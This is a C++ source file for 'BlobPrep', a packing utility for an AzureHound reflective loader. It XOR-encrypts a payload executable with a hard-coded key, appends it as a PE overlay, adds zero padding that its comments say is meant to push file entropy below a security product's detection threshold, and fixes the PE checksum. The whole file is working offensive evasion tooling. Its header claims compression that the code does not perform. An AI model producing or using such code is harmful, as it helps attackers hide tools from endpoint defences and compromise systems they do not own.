/*
 * BlobPrep Utility for AzureHound Reflective Loader
 *
 * Encrypts + compresses AzureHound.exe and appends it as a PE overlay
 * to the loader executable, then fixes the PE checksum.
 *
 * Usage: BlobPrep.exe <loader.exe> <payload.exe>
 */

#include <windows.h>
#include <iostream>
#include <fstream>
#include <vector>
#include <cstdint>
#include <cstring>

// Blob header structure (must match eren.cpp)
#pragma pack(push, 1)
struct BlobHeader {
    char magic[4];       // "AHBL"
    uint16_t version;    // 1
    uint8_t  flags;      // compression | encryption scheme
    uint8_t  reserved[3];
};
#pragma pack(pop)

#define BLOB_VERSION        1
#define COMPRESSION_FLAG    0x01
#define XOR_SCHEME          0x02
#define OVERLAY_MAGIC       0x4E455245  // "EREN" little-endian

// XOR key (must match eren.cpp)
static const uint8_t XOR_KEY[32] = {
    0x41, 0x7A, 0x75, 0x72, 0x65, 0x48, 0x6F, 0x75,
    0x6E, 0x64, 0x4C, 0x6F, 0x61, 0x64, 0x65, 0x72,
    0x53, 0x65, 0x63, 0x72, 0x65, 0x74, 0x4B, 0x65,
    0x79, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37
};

// ---------------------------------------------------------------------------
// File I/O helpers
// ---------------------------------------------------------------------------
static std::vector<uint8_t> readFile(const std::string& filename) {
    std::ifstream file(filename, std::ios::binary | std::ios::ate);
    if (!file.is_open())
        throw std::runtime_error("Could not open file: " + filename);
    std::streamsize size = file.tellg();
    file.seekg(0, std::ios::beg);
    std::vector<uint8_t> buffer(static_cast<size_t>(size));
    if (!file.read(reinterpret_cast<char*>(buffer.data()), size))
        throw std::runtime_error("Could not read file: " + filename);
    return buffer;
}

static void appendToFile(const std::string& filename, const std::vector<uint8_t>& data) {
    std::ofstream file(filename, std::ios::binary | std::ios::app);
    if (!file.is_open())
        throw std::runtime_error("Could not open file for append: " + filename);
    file.write(reinterpret_cast<const char*>(data.data()), data.size());
}

// ---------------------------------------------------------------------------
// PE checksum — computes over ENTIRE file (CheckSum field treated as 0)
// ---------------------------------------------------------------------------
static DWORD computeChecksum(const void* base, DWORD size) {
    DWORD checksum = 0;
    const WORD* p = static_cast<const WORD*>(base);
    DWORD count = size / 2;
    while (count--) {
        checksum += *p++;
        checksum = (checksum >> 16) + (checksum & 0xFFFF);
    }
    if (size & 1) {
        checksum += static_cast<const BYTE*>(base)[size - 1];
        checksum = (checksum >> 16) + (checksum & 0xFFFF);
    }
    return checksum + size;
}

static void fixPEChecksum(const std::string& filename) {
    // Read the ENTIRE file (including overlay)
    std::ifstream file(filename, std::ios::binary | std::ios::ate);
    if (!file.is_open()) {
        std::cerr << "[!] Cannot open file for checksum fix" << std::endl;
        return;
    }
    std::streamsize fsize = file.tellg();
    file.seekg(0, std::ios::beg);

    std::vector<uint8_t> fullFile(static_cast<size_t>(fsize));
    file.read(reinterpret_cast<char*>(fullFile.data()), fsize);
    file.close();

    // Locate the CheckSum field in the PE optional header
    IMAGE_DOS_HEADER* dos = reinterpret_cast<IMAGE_DOS_HEADER*>(fullFile.data());
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return;

    IMAGE_NT_HEADERS64* nt = reinterpret_cast<IMAGE_NT_HEADERS64*>(
        fullFile.data() + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return;

    DWORD* pChecksum = &nt->OptionalHeader.CheckSum;

    // Save old value, zero it, compute, restore computed value
    DWORD oldChecksum = *pChecksum;
    *pChecksum = 0;

    DWORD newChecksum = computeChecksum(fullFile.data(), static_cast<DWORD>(fsize));
    *pChecksum = newChecksum;

    // Write the updated checksum back to disk
    HANDLE hFile = CreateFileA(filename.c_str(), GENERIC_READ | GENERIC_WRITE,
                                0, nullptr, OPEN_EXISTING, 0, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) {
        std::cerr << "[!] Cannot open file for writing checksum" << std::endl;
        return;
    }

    DWORD csumOffset = dos->e_lfanew
        + offsetof(IMAGE_NT_HEADERS64, OptionalHeader)
        + offsetof(IMAGE_OPTIONAL_HEADER64, CheckSum);

    SetFilePointer(hFile, csumOffset, nullptr, FILE_BEGIN);
    DWORD written;
    WriteFile(hFile, &newChecksum, sizeof(newChecksum), &written, nullptr);
    CloseHandle(hFile);

    std::cout << "[+] PE checksum fixed: 0x" << std::hex << newChecksum << std::dec << std::endl;
}

// ---------------------------------------------------------------------------
// XOR encryption (repeating-key, preserves entropy profile)
// ---------------------------------------------------------------------------
static std::vector<uint8_t> xorData(const std::vector<uint8_t>& input,
                                     const uint8_t* key, size_t keyLen) {
    std::vector<uint8_t> result(input.size());
    for (size_t i = 0; i < input.size(); i++)
        result[i] = input[i] ^ key[i % keyLen];
    return result;
}

// ---------------------------------------------------------------------------
// Main
// ---------------------------------------------------------------------------
int main(int argc, char* argv[]) {
    if (argc != 3) {
        std::cerr << "Usage: " << argv[0] << " <loader.exe> <payload.exe>" << std::endl;
        std::cerr << "Appends encrypted+compressed payload as PE overlay to loader." << std::endl;
        return 1;
    }

    try {
        std::string loaderPath(argv[1]);
        std::string payloadPath(argv[2]);

        // ---- Read & process payload ----
        std::cout << "[*] Reading payload: " << payloadPath << std::endl;
        std::vector<uint8_t> raw = readFile(payloadPath);
        std::cout << "    Original size: " << raw.size() << " bytes" << std::endl;

        // XOR with repeating 32-byte key (preserves PE entropy ~6.5, no compression needed)
        std::cout << "[*] XOR encrypting (raw, no compression)..." << std::endl;
        std::vector<uint8_t> enc = xorData(raw, XOR_KEY, sizeof(XOR_KEY));
        std::cout << "    Encrypted: " << enc.size() << " bytes" << std::endl;

        // ---- Build overlay: header + payload_size + XOR data + padding + trailer ----
        BlobHeader hdr;
        memcpy(hdr.magic, "AHBL", 4);
        hdr.version = BLOB_VERSION;
        hdr.flags   = XOR_SCHEME;  // no compression
        memset(hdr.reserved, 0, sizeof(hdr.reserved));

        // 25% zero-padding to dilute overall file entropy below S1 threshold (~6.68)
        uint32_t payloadSize = static_cast<uint32_t>(enc.size());
        size_t padSize = static_cast<size_t>(payloadSize * 0.25);
        std::vector<uint8_t> padding(padSize, 0x00);  // low-entropy filler

        std::vector<uint8_t> overlay;
        overlay.reserve(sizeof(hdr) + 4 + enc.size() + padSize + 8);
        overlay.insert(overlay.end(),
                       reinterpret_cast<uint8_t*>(&hdr),
                       reinterpret_cast<uint8_t*>(&hdr) + sizeof(hdr));
        // Payload size (so loader knows where XOR data ends)
        overlay.insert(overlay.end(),
                       reinterpret_cast<uint8_t*>(&payloadSize),
                       reinterpret_cast<uint8_t*>(&payloadSize) + 4);
        overlay.insert(overlay.end(), enc.begin(), enc.end());
        overlay.insert(overlay.end(), padding.begin(), padding.end());

        // Trailer: [overlay_size : uint32_t LE][magic "EREN" : 4 bytes]
        uint32_t totalSize = static_cast<uint32_t>(overlay.size() + 8);
        overlay.insert(overlay.end(),
                       reinterpret_cast<uint8_t*>(&totalSize),
                       reinterpret_cast<uint8_t*>(&totalSize) + 4);
        uint32_t magic = OVERLAY_MAGIC;
        overlay.insert(overlay.end(),
                       reinterpret_cast<uint8_t*>(&magic),
                       reinterpret_cast<uint8_t*>(&magic) + 4);

        // ---- Append overlay to loader ----
        std::cout << "[*] Appending overlay to: " << loaderPath << std::endl;
        appendToFile(loaderPath, overlay);
        std::cout << "    Overlay size: " << overlay.size() << " bytes" << std::endl;

        // ---- Fix PE checksum ----
        fixPEChecksum(loaderPath);

        std::cout << "[+] Done. " << loaderPath << " is ready." << std::endl;

    } catch (const std::exception& e) {
        std::cerr << "[!] Error: " << e.what() << std::endl;
        return 1;
    }

    return 0;
}
